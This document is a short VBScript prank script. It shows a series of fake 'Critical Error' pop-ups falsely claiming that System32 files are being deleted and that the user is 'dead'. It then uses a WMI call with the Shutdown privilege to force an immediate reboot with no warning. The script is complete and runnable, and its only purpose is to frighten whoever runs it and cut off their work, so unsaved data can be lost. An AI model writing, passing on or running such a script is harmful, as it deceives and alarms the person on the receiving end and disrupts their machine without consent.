X=MsgBox("System32 Files Are Getting Deleting",0+16,"Critical Error")
X=MsgBox("BYE",0+16,"Critical Error")
X=MsgBox("BYE",0+16,"Critical Error")
X=MsgBox("BYE",0+16,"Critical Error")
X=MsgBox("BYE",0+16,"Critical Error")
X=MsgBox("BYE",0+16,"Critical Error")
X=MsgBox("BYE",0+16,"Critical Error")
X=MsgBox("BYE",0+16,"Critical Error")
X=MsgBox("YOU ARE DEAD" ,0+16, "DEATH IS HERE")

Set OpSysSet = GetObject("winmgmts:{authenticationlevel=Pkt," _
     & "(Shutdown)}").ExecQuery("select * from Win32_OperatingSystem where "_
     & "Primary=true")
for each OpSys in OpSysSet
    retVal = OpSys.Reboot()
next
